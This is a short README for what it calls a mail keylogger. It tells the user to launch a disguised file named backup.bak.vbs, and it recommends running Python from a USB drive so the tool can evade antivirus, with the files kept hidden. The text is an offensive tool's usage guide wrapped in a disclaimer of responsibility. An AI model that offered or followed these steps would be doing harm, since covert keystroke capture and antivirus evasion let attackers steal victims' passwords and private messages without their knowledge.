a mail keylogger (I don't take responsibility for the use that will be made of this program)
just start the backup.bak.vbs file (the name is to hide the program) and you are ready to keystroke logger attack
Remind to install python on your usb drive (tutorial inside info dir) it's the only way to sneak through the antivirus and remind to hide files inside
